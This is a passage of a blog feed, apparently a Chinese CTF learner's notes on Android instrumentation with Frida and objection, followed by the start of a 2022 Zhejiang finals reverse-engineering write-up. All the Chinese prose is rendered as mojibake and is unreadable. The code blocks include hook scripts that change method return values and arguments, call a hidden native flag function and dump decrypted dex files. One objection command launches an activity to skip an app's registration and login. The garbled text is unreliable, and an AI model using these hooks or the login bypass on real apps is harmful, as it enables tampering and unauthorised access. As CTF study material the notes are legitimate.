class="headerlink" title="é™æ€"></a>é™æ€</h2><p>æ¨¡æ‹Ÿå™¨ä¸Šå¯åŠ¨è½¯ä»¶åå†å»æ³¨å…¥mobileåŒ…ï¼š<code>objection -g mobilego explore</code></p><p>æœ‰æ—¶å€™åç§°ç”¨ç©ºæ ¼éš”å¼€ï¼Œç”¨å¼•å·æ ‡æ³¨</p><img src="/2024/10/28/frida/1709109344969-4cc3e1af-1096-4c60-8771-0483fe7350d7-174722520330125.png" class="" title="img"><p>åœ¨å†…å­˜ä¸­æ‰€æœ‰å·²åŠ è½½çš„ç±»ä¸­æœç´¢åŒ…å«gameçš„ç±»ï¼š<code>android hooking search classes game</code></p><p>æŸ¥çœ‹com.android.settings.DisplaySettingsç±»æœ‰å“ªäº›æ–¹æ³•ï¼š<code>android hooking list class_methods com.android.settings.DisplaySettings</code></p><p>ç›´æ¥ç”Ÿæˆä»£ç ä½†å¯èƒ½æ²¡å‚æ•°ï¼š<code>**android hooking generate  simple  com.android.settings.DisplaySettings**</code></p><p>åœ¨å †ä¸Šæœç´¢æ˜¯å¦å­˜åœ¨DisplaySettingsç±»çš„å®ä¾‹ï¼š<code>android heap search instances com.android.settings.DisplaySettings</code></p><p>è¿›å…¥æ˜¾ç¤ºè®¾ç½®ï¼Œè½¯ä»¶å¦‚æœæ²¡æœ‰åšæ ¡éªŒï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤è·³è¿‡æ³¨å†Œç™»å½•ï¼š<code>android intent launch_activity com.android.settings.DisplaySettings</code></p><p>è¯†åˆ«åº”ç”¨ç¨‹åºçš„å„ç§æ•°æ®ç›®å½•:<code>env</code></p><h2 id="åŠ¨æ€"><a href="#åŠ¨æ€" class="headerlink" title="åŠ¨æ€"></a>åŠ¨æ€</h2><p>hookç±»ï¼š<code>android hooking watch class android.bluetooth.BluetoothDevice</code></p><p>hookæ–¹æ³•ï¼ŒæŸ¥çœ‹å‚æ•°ã€è¿”å›å€¼å’Œè°ƒç”¨æ ˆï¼š<code>**android hooking watch class_method game.Game.checkflag --dump-args --dump-return --dump-backtrace**</code>(æ³¨æ„æ–¹æ³•åä»åŒ…åå¼€å§‹å†™ï¼‰</p><p>åœ¨æ¨¡æ‹Ÿå™¨è¾“å…¥å­—ç¬¦ä¸²ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklï¼ˆç¬¦åˆé¢˜ç›®è¦æ±‚ï¼‰åï¼Œå†<code>Called game.Game.checkflag(java.lang.String)</code>ï¼Œå¾—åˆ°returnå€¼</p><img src="/2024/10/28/frida/1709109675749-a27f484c-05c7-4662-a271-9eb7f9585c85-174722520330127.png" class="" title="img"><p>è¿˜å¯ä»¥import jsä»£ç </p><img src="/2024/10/28/frida/1719304694731-f541e617-8644-4a2d-ae02-461a589d0cfc-174722520330129.png" class="" title="img"><h2 id="hookè„šæœ¬"><a href="#hookè„šæœ¬" class="headerlink" title="hookè„šæœ¬"></a>hookè„šæœ¬</h2><p>frida -U -l 1.js -f com.example.myapplication</p><p>åŒ…åé€šè¿‡frida-ps -U -aæŸ¥çœ‹</p><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><p>javaå±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> <span class="hljs-title class_">Myjni</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.whathappened.MyJNI.Myjni&quot;</span>);<br>  <span class="hljs-title class_">Myjni</span>[<span class="hljs-string">&quot;getstr&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> re0 = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getstr&quot;</span>](); <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;re0&#125;</span>`</span>); <br>    <span class="hljs-keyword">return</span> re0;<br>  &#125;;<br>&#125;);<br>                &#125;                  <br><span class="hljs-title function_">setImmediate</span>(main); <br><br><span class="hljs-comment">//ä¹Ÿå¯ä»¥åƒä¸‹é¢è¿™ç§è‡ªå·±è®¾å®šå‚æ•°ç„¶åè¿”å›</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">a,b</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Origin i and i2 = &quot;</span>,a,b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(a,b);<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook2</span>();<br>    &#125;)<br>&#125;<br> <br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>nativeå±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> check_flag = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;liba0x9.so&quot;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;function&quot;</span>];<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Func address = &quot;</span>,check_flag);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(check_flag,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br> <br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Origin retval : &quot;</span>,retval);<br>            <span class="hljs-comment">//retval.replace(1337);</span><br>        &#125;<br>    &#125;)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(hook);<br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°åœ°å€"><a href="#å‡½æ•°åœ°å€" class="headerlink" title="å‡½æ•°åœ°å€"></a>å‡½æ•°åœ°å€</h3><p>Module.enumerateImports(â€œlibfrida0x8.soâ€)æŸ¥çœ‹å¯¼å…¥è¡¨</p><p>Module.findExportByName():é€šè¿‡æä¾›å¯¼å‡ºé¡¹çš„åç§°ä½œä¸ºå‚æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸è¯¥åç§°å¯¹åº”çš„å¯¼å‡ºé¡¹çš„åœ°å€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> func_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libmidand.so&quot;</span> , <span class="hljs-string">&quot;_Z10murmur3_32PKcjj&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;func addr is ---&quot;</span> + func_addr);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(func_addr, &#123;<br>  <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;enter murmur3_32 retvalue-&gt;\n&quot;</span> + <span class="hljs-title function_">hexdump</span>(args));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>javaå±‚å¯ä»¥ç›´æ¥æ‹¿å‡½æ•°åå­—æ¥hookï¼Œsoå±‚å°±è¦å…ˆé€šè¿‡å‡½æ•°åæ¥æ‰¾åˆ°è¯¥å‡½æ•°çš„åœ°å€ï¼Œç„¶åä»¥åœ°å€ä¸ºåŸºå‡†è¿›è¡Œhook</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">frida</span> -U -l <span class="hljs-number">1</span>.js  MidAnd<br></code></pre></td></tr></table></figure><p>frida -U -f com.example.demo1 â€“no-pause -l agent&#x2F;demo1&#x2F;demo1.jsï¼š-fæŒ‡å®šç›®æ ‡åº”ç”¨ç¨‹åºçš„åŒ…å</p><img src="/2024/10/28/frida/1710167737741-cb30566e-19d1-4dba-8a89-5fa60ac95426-174722520330131.png" class="" title="img"><p>ä¸€å¼€å§‹ä¸€ç›´ä¸è®©è¾“getè¿”å›å€¼çš„å‘½ä»¤ï¼Œåœ¨æ¨¡æ‹Ÿå™¨ç«¯è¾“å…¥å­—ç¬¦ç„¶åç‚¹loginå°±å¥½äº†</p><img src="/2024/10/28/frida/1710166946004-61d68afc-f771-4451-b35c-f5215bb59651-174722520330133.png" class="" title="img"><p>å‘ç°æœ‰è¿”å›å€¼äº†</p><img src="/2024/10/28/frida/1710166891275-3b1302ac-022b-4296-b8c7-b9fdff543fea-174722520330135.png" class="" title="img"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br> <br>    <span class="hljs-keyword">var</span> targetAddress = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Strcmp Address: &quot;</span>,targetAddress.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br> <br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<span class="hljs-comment">//è·å–è¾“å…¥å­—ç¬¦ä¸²</span><br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;111&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br> <br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br> <br>        &#125;<br>    &#125;)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br>&#125;<br> <br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><h3 id="é‡è½½æ–¹æ³•-å®ä¾‹æ–¹æ³•-é™æ€æ–¹æ³•"><a href="#é‡è½½æ–¹æ³•-å®ä¾‹æ–¹æ³•-é™æ€æ–¹æ³•" class="headerlink" title="é‡è½½æ–¹æ³•&#x2F;å®ä¾‹æ–¹æ³•&#x2F;é™æ€æ–¹æ³•"></a>é‡è½½æ–¹æ³•&#x2F;å®ä¾‹æ–¹æ³•&#x2F;é™æ€æ–¹æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ç›¸å½“äºæ˜¯æ‰¾åˆ°ç±» Class å¯¹è±¡</span><br><span class="hljs-keyword">var</span> fridaDemo1Class = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.demo1.FridaDemo1&quot;</span>)<br><br><span class="hljs-comment">// hook com.example.demo1.FridaDemo1#func(int, int)</span><br>fridaDemo1Class.<span class="hljs-property">func</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">arg1, arg2</span>) &#123;<br>  <span class="hljs-comment">// è·å–åŸå‡½æ•°çš„ç»“æœ</span><br>  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func</span>(arg1, arg2);<br>  <span class="hljs-comment">// æ‰“å°å‚æ•°ä¸ç»“æœ</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;arg1, arg2, result&quot;</span>, arg1, arg2, result)<br>  <span class="hljs-comment">// æ”¹å˜å‡½æ•°çš„ç»“æœ</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">9527</span>;<br>&#125;<br><br><span class="hljs-comment">// hook com.example.demo1.FridaDemo1#func(java.lang.String)</span><br>fridaDemo1Class.<span class="hljs-property">func</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">arg1</span>) &#123;<br>  <span class="hljs-comment">// æ„é€ ä¸€ä¸ª String å¯¹è±¡</span><br>  <span class="hljs-keyword">var</span> helloStr = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).$new(<span class="hljs-string">&#x27;Hello&#x27;</span>)<br>  <span class="hljs-comment">// æ”¹å˜ä¼ é€’çš„å‚æ•°ï¼Œæ‰§è¡ŒåŸå‡½æ•°</span><br>  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func</span>(helloStr);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;arg1, result&quot;</span>, arg1, result)<br>  <span class="hljs-comment">// è¿”å› world</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).$new(<span class="hljs-string">&quot;World&quot;</span>);<br>&#125;<br><span class="hljs-comment">//æ‰€æœ‰å®ä¾‹æ–¹æ³•</span><br><span class="hljs-comment">// æ‰¾åˆ°ç±»çš„å®ä¾‹å¯¹è±¡</span><br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.example.demo1.MainActivity&quot;</span>, &#123;<br>    <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;found instance :&quot;</span>, instance)<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;found instance :&quot;</span>, instance.<span class="hljs-title function_">abc</span>())<br>    &#125;, <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; &#125;<br>&#125;)<br><br><span class="hljs-comment">// hook com.example.demo1.FridaDemo1#nice</span><br>fridaDemo1Class.<span class="hljs-property">nice</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// è·å–åŸå‡½æ•°çš„ç»“æœ</span><br>  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">nice</span>();<br>  <span class="hljs-comment">// æ‰“å°å‚æ•°ä¸ç»“æœ</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;nice result&quot;</span>, result)<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">//æ‰€æœ‰é™æ€æ–¹æ³•</span><br><span class="hljs-keyword">var</span> result = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.demo1.MainActivity&quot;</span>).<span class="hljs-title function_">sabc</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br></code></pre></td></tr></table></figure><h3 id="è°ƒç”¨ä¸»å‡½æ•°ä¸­æœªè¢«è°ƒç”¨çš„æ–¹æ³•"><a href="#è°ƒç”¨ä¸»å‡½æ•°ä¸­æœªè¢«è°ƒç”¨çš„æ–¹æ³•" class="headerlink" title="è°ƒç”¨ä¸»å‡½æ•°ä¸­æœªè¢«è°ƒç”¨çš„æ–¹æ³•"></a>è°ƒç”¨ä¸»å‡½æ•°ä¸­æœªè¢«è°ƒç”¨çš„æ–¹æ³•</h3><p>nativeå±‚æœ‰æœªè¢«è°ƒç”¨çš„flagå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libfrida0xa.so&quot;</span>);<br>    <span class="hljs-keyword">var</span> b = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;libfrida0xa.so&quot;</span>);<br>    <span class="hljs-keyword">var</span> get_flagaddress = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">var</span> mvaddress = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span> ; b[i]!= <span class="hljs-literal">null</span> ; i ++ )&#123;<br>        <span class="hljs-comment">// console.log(b[i][&quot;name&quot;])</span><br>        <span class="hljs-keyword">if</span>(b[i][<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;_Z8get_flagii&quot;</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;function get_flag : &quot;</span>,b[i][<span class="hljs-string">&quot;address&quot;</span>]);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((b[i][<span class="hljs-string">&quot;address&quot;</span>] - a).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>     <span class="hljs-comment">//       mvaddress = b[i][&quot;address&quot;] - a;</span><br>            get_flagaddress = b[i][<span class="hljs-string">&quot;address&quot;</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ptr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br> <br>    <span class="hljs-keyword">var</span> get_flag_ptr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(get_flagaddress);<br>    <span class="hljs-keyword">const</span> get_flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr,<span class="hljs-string">&#x27;char&#x27;</span>,[<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>]);<br>    <span class="hljs-keyword">var</span> flag = <span class="hljs-title function_">get_flag</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag)<br>    <span class="hljs-comment">//console.log(b);</span><br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br><br><br><span class="hljs-comment">//ä¹Ÿå¯ä»¥ç”¨åç§»é‡çš„æ–¹å¼</span><br><span class="hljs-keyword">const</span> libBase = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libnative.so&quot;</span>);  <br><span class="hljs-keyword">const</span> funcAddr = libBase.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1234</span>);  <br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(funcAddr, &#123;  <br>    <span class="hljs-title function_">onEnter</span>(<span class="hljs-params">args</span>) &#123;  <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;è°ƒç”¨éšè—å‡½æ•°ï¼&quot;</span>);  <br>    &#125;  <br>&#125;);  <br></code></pre></td></tr></table></figure><h1 id="frida-dump"><a href="#frida-dump" class="headerlink" title="frida dump"></a>frida dump</h1><p>è¿æ¥frida-serverä¹‹åç”¨ <code>adb shell pm list packages</code>æ‰¾åˆ°çœŸæ­£çš„åŒ…åï¼Œæœ‰æ—¶å€™å’Œjadxé‡Œé¢æ˜¾ç¤ºçš„ä¸å¤ªä¸€æ ·</p><p> <code>frida-dexdump -U -f com.example.wyy</code>ç›´æ¥dumpå‡ºåŠ¨æ€è§£å¯†çš„dexï¼Œåªé€‚ç”¨x86ç³»åˆ—æ¶æ„</p><img src="/2024/10/28/frida/1745723762216-55a48603-e0eb-4e7c-a136-1a408b062bde.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>frida</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ™æ±Ÿçœçœèµ›2022å†³èµ›å¤ç°</title>
    <link href="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729825184503-feda2d33-3ef7-48cd-a688-48eb0c7f970f.png" class="" title="img"><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729825213201-f02099eb-2370-40bb-9d49-53aa64040b2c.png" class="" title="img"><p>é€†å‘å¯†ç ï¼Œå› ä¸ºå¯†æ–‡éƒ½æ˜¯å¶æ•°æ‰€ä»¥å¯ä»¥ç›´æ¥é€†ï¼Œå¦‚æœæœ‰å¥‡æ•°çš„è¯è¿˜å¾—çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, <span class="hljs-number">200</span>, <span class="hljs-number">412</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>   s+=<span class="hljs-built_in">chr</span>((a[i]&gt;&gt;<span class="hljs-number">2</span>)^<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment">#f4n_4ndro1d</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ¨¡æ‹Ÿå™¨è¾“å…¥è´¦å·å¯†ç 